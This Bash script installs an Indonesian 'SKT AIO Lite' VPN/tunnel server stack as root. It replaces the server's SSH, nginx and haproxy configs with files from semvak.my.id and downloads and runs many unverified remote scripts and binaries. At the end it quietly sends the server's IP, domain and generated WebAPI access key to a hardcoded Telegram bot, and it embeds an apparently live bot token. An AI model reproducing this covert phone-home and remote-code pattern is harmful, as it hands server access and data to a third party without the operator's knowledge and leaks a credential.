#!/bin/bash
#
#  |════════════════════════════════════════════════════════════════════════════════════════════════════════════════|
#  • Autoscript SKT AIO Lite - Jangan Lupa Sholat
#  |════════════════════════════════════════════════════════════════════════════════════════════════════════════════|
#
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
check="check.semvak.my.id"
#########################

BURIQ () {
    curl -sS https://${check}/akses.ip > /root/tmp
    data=( `cat /root/tmp | grep -E "^### " | awk '{print $2}'` )
    for user in "${data[@]}"
    do
    exp=( `grep -E "^### $user" "/root/tmp" | awk '{print $3}'` )
    d1=(`date -d "$exp" +%s`)
    d2=(`date -d "$biji" +%s`)
    exp2=$(( (d1 - d2) / 86400 ))
    if [[ "$exp2" -le "0" ]]; then
    echo $user > /etc/.$user.ini
    else
    rm -f  /etc/.$user.ini > /dev/null 2>&1
    fi
    done
    rm -f  /root/tmp
}
MYIP=$(curl -sS ipv4.icanhazip.com)
ip=$(curl -s ipv4.icanhazip.com)
hariini=$(date -d "0 days" +"%Y-%m-%d")
echo $Name > /usr/local/etc/.$Name.ini
CekOne=$(cat /usr/local/etc/.$Name.ini)

Bloman () {
if [ -f "/etc/.$Name.ini" ]; then
CekTwo=$(cat /etc/.$Name.ini)
    if [ "$CekOne" = "$CekTwo" ]; then
        res="Expired"
    fi
else
res="Permission Accepted..."
fi
}

PERMISSION () {
    MYIP=$(curl -sS ipv4.icanhazip.com)
    IZIN=$(curl -sS https://${check}/akses.ip | awk '{print $4}' | grep $MYIP)
    if [ "$MYIP" = "$IZIN" ]; then
    Bloman
    else
    res="Permission Denied!"
    fi
    BURIQ
}

clear
red='\e[1;31m'
green='\e[0;32m'
yell='\e[1;33m'
tyblue='\e[1;36m'
NC='\e[0m'
purple() { echo -e "\\033[35;1m${*}\\033[0m"; }
tyblue() { echo -e "\\033[36;1m${*}\\033[0m"; }
yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }
cd /root
#System version number
if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi

localip=$(hostname -I | cut -d\  -f1)
hst=( `hostname` )
dart=$(cat /etc/hosts | grep -w `hostname` | awk '{print $2}')
if [[ "$hst" != "$dart" ]]; then
echo "$localip $(hostname)" >> /etc/hosts
fi
start=$(date +%s)
echo -e "[ ${green}!!${NC} ] Please Waitt...."
apt install git curl -y >/dev/null 2>&1
sleep 2
echo -e "[ ${green}!!${NC} ] Checking database ip"
sleep 2
echo -ne "Checking : "

PERMISSION
if [ -f /home/needupdate ]; then
red "Your script need to update first !"
exit 0
elif [ "$res" = "Permission Accepted..." ]; then
green "Permission Accepted.!"
sleep 3
else
red "Permission Denied.!"
rm -rf run > /dev/null 2>&1
sleep 10
exit 0
fi

link="https://raw.githubusercontent.com/DindaPutriFN/DindaPutriFN/main/api"
clear
#echo "Port 22
#Port 3303
#Port 53" >> /etc/ssh/sshd_config
#systemctl stop systemd-resolved
#systemctl restart ssh
#systemctl restart sshd
#systemctl start systemd-resolved
clear
[[ -e $(which curl) ]] && if [[ -z $(cat /etc/resolv.conf | grep "1.1.1.1") ]]; then cat <(echo "nameserver 1.1.1.1") /etc/resolv.conf > /etc/resolv.conf.tmp && mv /etc/resolv.conf.tmp /etc/resolv.conf; fi
clear

#Bikin File
clear
mkdir -p /etc/slowdns
mkdir -p /etc/xray
mkdir -p /etc/funny
mkdir -p /var
mkdir -p /var/lib
mkdir -p /var/log
mkdir -p /var/log/xray
touch /var/log/xray/access.log
chmod +x /var/log/xray/*
clear

#domain
read -rp "❒ Masukan Nama Domain: " domain
#read -p "Nameserver: " nsdomain
#read -p "Api Bot Token: " api
#read -p "Admin ID Telegram: " id
#echo "$api" > /etc/funny/.keybot
#echo "$id" > /etc/funny/.chatid
#echo "$nsdomain" >/etc/slowdns/nsdomain
echo "$domain" > /etc/xray/domain

#Key
uuid=$(cat /proc/sys/kernel/random/uuid)
echo -e "${uuid}" > /etc/xray/.key
chmod +x /etc/xray/.key
api773=$(cat /etc/xray/.key)

#email
#read -rp "Masukkan Email anda: " email

#Preparation
clear
cd;
apt-get update;

#Remove unused Module
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get -y --purge remove apache2*
apt remove apache2 -y
apt autoremove -y

clear

#install toolkit
apt-get install libio-socket-inet6-perl libsocket6-perl libcrypt-ssleay-perl libnet-libidn-perl perl libio-socket-ssl-perl libwww-perl libpcre3 libpcre3-dev zlib1g-dev dbus iftop zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr dnsutils sudo at htop iptables bsdmainutils cron lsof lnav -y

#Install tools
apt install screen -y
apt install binutils -y
apt install socat -y
apt install lolcat -y
apt install ruby -y
gem install lolcat
apt install lolcat -y
apt install wget curl -y
apt install htop -y
#apt install speedtest-cli -y
apt install cron -y
apt install figlet -y
apt install zip unzip -y
apt install jq -y
apt install certbot -y
apt install python2 -y
apt install python3 -y
apt install screen -y
apt install haproxy -y
apt install at -y

# Konfigurasi OpenSSH
cd /etc/ssh
rm -fr /etc/ssh/sshd_config
wget -O sshd_config "https://semvak.my.id/package/sshd_config"
systemctl daemon-reload
systemctl restart ssh
systemctl restart sshd

# Information
curl ipinfo.io/org > /root/.isp
curl ipinfo.io/city > /root/.city
curl ipinfo.io/region > /root/.region

# // Menginstall Dropbear
apt install dropbear -y
rm /etc/default/dropbear
rm /etc/issue.net
cat> /etc/issue.net << END
</strong> <B><h5 style='text-align:center';><font color='#07D41'><B>‌‌▬▭▬▭‌▬▭▬▭▬▭‌▬▭▬▭▬<br></font><span'><font color="green">🐍 SKARTI </font><font color="#f57c00">𝐕𝐏𝐍</font> <font color="green">TUNNEL 🐍</span></font><font color='#007D41'><br>‌‌‌‌▬▭▬▭‌▬▭▬▭▬▭‌▬▭▬▭▬<br></font><span><font color="white">JANGAN LUPA SHOLAT !</span><br><br><b>⛔ 𝐓erms 𝐎f 𝐒ervice ⛔<br>No 18+<br>No Multi Login<br>Max Login 2 Device<br><B><span style='text-align:center';><br><b>💯 Amanah & Bergaransi<br>https://t.me/SaputraTech<br><B><span style='text-align:center';><font color='#07D41'><B>‌▬▭▬▭‌▬▭▬▭▬▭‌▬▭▬▭▬<br></font><span'><font color="white">🏅 Thanks You For Support 🏅</span></font><font color='#007D41'><br>‌‌‌‌▬▭▬▭‌▬▭▬▭▬▭‌▬▭▬▭▬</h5><br>
END
cat>  /etc/default/dropbear << END
# disabled because OpenSSH is installed
# change to NO_START=0 to enable Dropbear
NO_START=0
# the TCP port that Dropbear listens on
DROPBEAR_PORT=111

# any additional arguments for Dropbear
DROPBEAR_EXTRA_ARGS="-p 109 -p 69 "

# specify an optional banner file containing a message to be
# sent to clients before they connect, such as "/etc/issue.net"
DROPBEAR_BANNER="/etc/issue.net"

# RSA hostkey file (default: /etc/dropbear/dropbear_rsa_host_key)
#DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"

# DSS hostkey file (default: /etc/dropbear/dropbear_dss_host_key)
#DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"

# ECDSA hostkey file (default: /etc/dropbear/dropbear_ecdsa_host_key)
#DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"

# Receive window size - this is a tradeoff between memory and
# network performance
DROPBEAR_RECEIVE_WINDOW=65536
END
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
dd=$(ps aux | grep dropbear | awk '{print $2}')
kill $dd
clear
systemctl daemon-reload
/etc/init.d/dropbear restart
clear

#Mengintall Xray
cd /etc/xray
wget -q -O config.json "https://semvak.my.id/config.json"
#wget -q -O http.json "https://raw.githubusercontent.com/DindaPutriFN/sslh/main/http.json"
#wget -q -O split.json "https://raw.githubusercontent.com/DindaPutriFN/sslh/main/split.json"
chmod +x /etc/xray/*

# Other
cd /usr/bin
wget -q -O m.zip "https://semvak.my.id/1.10.zip"
yes A | unzip m.zip
rm -fr m.zip
chmod +x *
cd /usr/bin/rere
chmod +x *
cd

#Apache2 Fix
systemctl daemon-reload
systemctl stop apache2
systemctl disable apache2

# Setup Haproxy Old
#rm -fr /etc/haproxy/haproxy.cfg
#wget -q -O /etc/haproxy/haproxy.cfg "https://raw.githubusercontent.com/DindaPutriFN/sslh/main/haproxy.cfg"

# Setup Konfiguration Multiport for port 443
# Mendapatkan informasi distribusi OS
os_name=$(lsb_release -si)
os_version=$(lsb_release -sr)

# Kondisi untuk Ubuntu 24.04 dan Debian 12
if [[ "$os_name" == "Ubuntu" && "$os_version" == "24.04" ]]; then
    echo "Menjalankan setup untuk Ubuntu 24.04."
    rm -fr /etc/haproxy
    systemctl stop haproxy
    systemctl disable haproxy
    apt install stunnel4 -y
    cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/xray/funny.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1

[https]
accept = 777
connect = 127.0.0.1:18020
END
elif [[ "$os_name" == "Debian" && "$os_version" == "12" ]]; then
    echo "Menjalankan setup untuk Debian 12."
    rm -fr /etc/haproxy
    systemctl stop haproxy
    systemctl disable haproxy
    apt install stunnel4 -y
    cat > /etc/stunnel/stunnel.conf <<-END
cert = /etc/xray/funny.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1

[https]
accept = 777
connect = 127.0.0.1:18020
END
else
    echo "Menjalankan setup untuk OS lainnya (Ubuntu 18/20/22, Debian 9/10/11, Kali Linux)."
    rm -fr /etc/haproxy/haproxy.cfg
    wget -q -O /etc/haproxy/haproxy.cfg "https://semvak.my.id/haproxy.cfg"
fi

#Set Timezone GMT+7
timedatectl set-timezone Asia/Jakarta;

#install latest xray
cd /usr/bin
wget -q https://raw.githubusercontent.com/DindaPutriFN/DindaPutriFN/main/api/xray.zip
yes A | unzip xray.zip ; rm -fr xray.zip
chmod +x *.dat
chmod +x xray
cd

#profile
apt install neofetch -y
cat > /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
#neofetch --ascii_distro Arcolinux_small
menu
END
chmod 644 /root/.profile

#crontab
echo "0 0,6,12,18 * * * root backup
0,15,30,45 * * * * root /usr/bin/xp
*/5 * * * * root limit-ip" >> /etc/crontab
systemctl restart cron

#Install VNSTAT
apt install vnstat -y

# Menginstal Argo Core
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
rm -fr cloudflared-linux-amd64.deb

# Menginstall Nodejs
apt install nodejs -y

#Install Speedtest
#curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | sudo bash
#sudo apt-get install speedtest -y

#install nginx
apt install nginx -y
rm /etc/nginx/conf.d/default.conf
cd /etc/nginx 
rm -fr nginx.conf
wget -q -O /etc/nginx/nginx.conf "https://semvak.my.id/nginx.conf"
cd

#detail nama perusahaan
country="Tukang Korupsi"
state="Konoha"
locality="DPRD"
organization="Foya-Foya"
organizationalunit="99999"
commonname="Semvak"
email="dprnow@dpr.go.id"

# delete
systemctl stop nginx haproxy
rm -fr /etc/xray/xray*
rm -fr /etc/xray/funny.pem

# make a certificate
openssl genrsa -out /etc/xray/xray.key 2048
openssl req -new -x509 -key /etc/xray/xray.key -out /etc/xray/xray.crt -days 1095 \
-subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email"
cat /etc/xray/xray.key /etc/xray/xray.crt >> /etc/xray/funny.pem
chmod 644 /etc/xray/*
systemctl restart nginx haproxy

#install socat
apt install iptables -y
apt install curl socat xz-utils wget apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y 
apt install socat cron bash-completion -y

#install firewall
apt install ufw -y
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https
sudo ufw allow 80/tcp
sudo ufw allow 8880/tcp
sudo ufw allow 443/tcp
sudo ufw allow 1194/tcp
sudo ufw allow 447/tcp
sudo ufw allow 444/tcp
sudo ufw allow 777/tcp
sudo ufw allow 2080/tcp
sudo ufw allow 2082/tcp
sudo ufw allow 2200/udp
yes | sudo ufw enable

# swap ram 2gb
#wget https://raw.githubusercontent.com/Cretezy/Swap/master/swap.sh -O swap
#sh swap 2G
#rm swap

# Make Other
touch /etc/xray/proxy.log

# [ Membersihkan layar ]
clear


# Install Slowdns
cd
wget -q https://semvak.my.id/package/slowdns.sh; chmod +x slowdns.sh; ./slowdns.sh; rm -fr slowdns.sh

# Install Chisel Proxy
cd
wget -q https://semvak.my.id/package/chisel.sh; chmod +x chisel.sh; ./chisel.sh; rm -fr chisel.sh

#Install Lainya
cd
wget -q https://semvak.my.id/package/udp.sh && chmod +x udp.sh && ./udp.sh

# Install Plugin HideSSH
cd
wget -q https://github.com/praiman99/Plugin-FN/raw/Beginner/plugin.sh ; chmod 777 plugin.sh ; ./plugin.sh ; rm -fr plugin.sh

# Install Warp Cloudflare
cd /root; wget -O wgcf.sh "https://raw.githubusercontent.com/DindaPutriFN/warp/main/install-warp.sh"; chmod +x /root/*; /root/wgcf.sh; rm -fr /root/*

# Install Backup Google Drive
cd /root
wget https://semvak.my.id/package/set-br.sh
chmod +x /root/*
cd /root
./set-br.sh
rm -fr /root/*

clear

#Install OpenVPN
cd
wget -q https://semvak.my.id/package/openvpn/vpn.sh && chmod +x vpn.sh && ./vpn.sh

# // Membuat Service
cat> /etc/systemd/system/xray.service << END
[Unit]
Description=Xray by AdminSN
Documentation=https://indo-ssh.com
After=network.target nss-lookup.target

[Service]
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/bin/xray -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23

[Install]
WantedBy=multi-user.target
END

#cat> /etc/systemd/system/httpupgrade.service << END
#[Unit]
#Description=Xray by FunnyVPN
#Documentation=https://indo-ssh.com
#After=network.target nss-lookup.target
#
#[Service]
#User=root
#CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
#AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
#NoNewPrivileges=true
#ExecStart=/usr/bin/xray -config /etc/xray/http.json
#Restart=on-failure
#RestartPreventExitStatus=23
#
#[Install]
#WantedBy=multi-user.target
#END
#
#cat> /etc/systemd/system/splithttp.service << END
#[Unit]
#Description=Xray by FunnyVPN
#Documentation=https://indo-ssh.com
#After=network.target nss-lookup.target
#
#[Service]
#User=root
#CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
#AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
#NoNewPrivileges=true
#ExecStart=/usr/bin/xray -config /etc/xray/split.json
#Restart=on-failure
#RestartPreventExitStatus=23
#
#[Install]
#WantedBy=multi-user.target
#END

#systemctl enable splithttp
#systemctl enable httpupgrade
#systemctl start splithttp
#systemctl start httpupgrade
#systemctl restart splithttp
#systemctl restart httpupgrade

wget -O /usr/bin/badvpn https://raw.githubusercontent.com/powermx/badvpn/master/badvpn-udpgw
chmod +x /usr/bin/badvpn
cat> /etc/systemd/system/badvpn.service << END
[Unit]
Description=BadVPN Gaming Support Port 7300 By FN Project
Documentation=https://t.me/fn_project
After=syslog.target network-online.target

[Service]
User=root
NoNewPrivileges=true
ExecStart=/usr/bin/badvpn --listen-addr 127.0.0.1:7300 --max-clients 500
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target
END

wget "https://docs.google.com/uc?export=download&id=1IbwfNpKpa1JzvXsDT-WgNpp5nWrklisG" -O /usr/bin/ws-com
chmod +x /usr/bin/ws-com
wget -O /usr/bin/config.yaml "https://semvak.my.id/package/config.yaml"
chmod +x /usr/bin/config.yaml
cat> /etc/systemd/system/proxy.service << END
[Unit]
Description=Proxy Socet All OS By AdminSN
Documentation=https://github.com/Rerechan-Team
After=syslog.target network-online.target

[Service]
User=root
NoNewPrivileges=true
ExecStart=/usr/bin/ws-com -f /usr/bin/config.yaml
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target
END

wget -q -O /usr/bin/ws "https://semvak.my.id/package/ws.py"
cat> /etc/systemd/system/edu.service << END
[Unit]
Description=Proxy Socet All OS By Rerechan02
Documentation=https://github.com/Rerechan02
After=syslog.target network-online.target

[Service]
User=root
NoNewPrivileges=true
ExecStart=/usr/bin/python3 /usr/bin/ws
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target
END

wget -O /usr/bin/loop "https://semvak.my.id/package/quota.sh"
chmod +x /usr/bin/loop
cat> /etc/systemd/system/quota.service << END
[Unit]
Description=Xray Quota Management Service By FN Project
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/loop
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
END

wget -O /usr/bin/server "https://semvak.my.id/package/server"
cat> /etc/systemd/system/server.service << END
[Unit]
Description=WebAPI Server Proxy All OS By Rerechan02
Documentation=https://github.com/Rerechan-Team
After=syslog.target network-online.target

[Service]
User=root
NoNewPrivileges=true
ExecStart=/usr/bin/python3 /usr/bin/server
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target
END

cd
clear

# Install HTTP Proxy
wget -O /usr/bin/http "https://raw.githubusercontent.com/DindaPutriFN/FN-API/main/core/http"
chmod +x /usr/bin/http
cat> /etc/systemd/system/http.service << END
[Unit]
Description=WebAPI Server Proxy All OS By Rerechan02
Documentation=https://github.com/Rerechan-Team
After=syslog.target network-online.target

[Service]
User=root
NoNewPrivileges=true
ExecStart=/usr/bin/http
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target
END

# Install OHP Server
wget -O /root/ohp.sh "https://semvak.my.id/package/ohp.sh"
chmod +x /root/ohp.sh
cd /root
./ohp.sh
rm -fr /root/*

# Menginstall All Proxy
wget -O /root/proxy.sh "https://semvak.my.id/package/other-proxy.sh"
chmod +x /root/proxy.sh
cd /root
./proxy.sh
rm -fr /root/*

#Megaktifkan Semua Service
systemctl daemon-reload

# Kondisi untuk Ubuntu 24.04 dan Debian 12
if [[ "$os_name" == "Ubuntu" && "$os_version" == "24.04" ]]; then
#Enable
systemctl enable proxy
systemctl enable server
systemctl enable badvpn
systemctl enable xray
systemctl enable edu
systemctl enable quota
systemctl enable http
#systemctl enable splithttp
#systemctl enable httpupgrade

#Start
systemctl start proxy
systemctl start server
systemctl start badvpn
systemctl start xray
systemctl start edu
systemctl start quota
systemctl start http
#systemctl start splithttp
#systemctl start httpupgrade

#Restart
systemctl restart proxy
systemctl restart edu
systemctl restart server
systemctl restart badvpn
systemctl restart xray
#systemctl restart splithttp
#systemctl restart httpupgrade
systemctl restart sslh
systemctl restart stunnel4
/etc/init.d/stunnel4 restart
systemctl restart stunnel
#systemctl restart haproxy
systemctl restart cron
systemctl restart dnstt
systemctl restart quota
systemctl restart http
#systemctl restart client-sldns
#systemctl restart server-sldns
END
elif [[ "$os_name" == "Debian" && "$os_version" == "12" ]]; then
#Enable
systemctl enable proxy
systemctl enable server
systemctl enable badvpn
systemctl enable xray
systemctl enable edu
systemctl enable quota
systemctl enable http
#systemctl enable splithttp
#systemctl enable httpupgrade

#Start
systemctl start proxy
systemctl start server
systemctl start badvpn
systemctl start xray
systemctl start edu
systemctl start quota
systemctl start http
#systemctl start splithttp
#systemctl start httpupgrade

#Restart
systemctl restart proxy
systemctl restart edu
systemctl restart server
systemctl restart badvpn
systemctl restart xray
#systemctl restart splithttp
#systemctl restart httpupgrade
systemctl restart sslh
systemctl restart stunnel4
/etc/init.d/stunnel4 restart
systemctl restart stunnel
#systemctl restart haproxy
systemctl restart cron
systemctl restart dnstt
systemctl restart quota
systemctl restart http
#systemctl restart client-sldns
#systemctl restart server-sldns
else
#Enable
systemctl enable proxy
systemctl enable server
systemctl enable badvpn
systemctl enable xray
systemctl enable edu
systemctl enable quota
systemctl enable http
#systemctl enable splithttp
#systemctl enable httpupgrade

#Start
systemctl start proxy
systemctl start server
systemctl start badvpn
systemctl start xray
systemctl start edu
systemctl start quota
systemctl start http
#systemctl start splithttp
#systemctl start httpupgrade

#Restart
systemctl restart proxy
systemctl restart edu
systemctl restart server
systemctl restart badvpn
systemctl restart xray
systemctl restart sslh
systemctl restart haproxy
systemctl restart cron
systemctl restart dnstt
systemctl restart quota
systemctl restart http
#systemctl restart splithttp
#systemctl restart httpupgrade
#systemctl restart client-sldns
#systemctl restart server-sldns
fi

#finishing
apt autoremove -y
apt clean
cd
rm /root/*.sh
rm -fr /root/*.py
nsdomain=$(cat /etc/slowdns/nsdomain)
systemctl restart nginx
systemctl restart ufw
OUTPUT="
=========================
DETAIL INSTALL SCRIPT 1.10
=========================
IP: $(curl ifconfig.me)
Domain: $domain
Namserver: $nsdomain
WebAPI: $api773
=========================
@SkartiVPN
"
CHATID="6389176425"
KEY="6981433170:AAFhh3UQi2H_lsJiAjGEMoj4xad2TdNHQfI"
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
curl -s --max-time $TIME --data-urlencode "chat_id=$CHATID" --data-urlencode "text=$OUTPUT" $URL >/dev/null 2>&1
clear
echo ""
echo -e "

  ___ _  _______     _   ___ ___    _____ _   _ _  _ _  _ ___ _    
 / __| |/ /_   _|   /_\ |_ _/ _ \  |_   _| | | | \| | \| | __| |   
 \__ \ ' <  | |    / _ \ | | (_) |   | | | |_| | .` | .` | _|| |__ 
 |___/_|\_\ |_|   /_/ \_\___\___/    |_|  \___/|_|\_|_|\_|___|____|
                                                                   
  ___ _  _ ___ _____ _   _    _      ___ _   _  ___ ___ ___ ___ ___ 
 |_ _| \| / __|_   _/_\ | |  | |    / __| | | |/ __/ __| __/ __/ __|
  | || .` \__ \ | |/ _ \| |__| |__  \__ \ |_| | (_| (__| _|\__ \__ \
 |___|_|\_|___/ |_/_/ \_\____|____| |___/\___/ \___\___|___|___/___/
                                                  
"
sleep 1.5
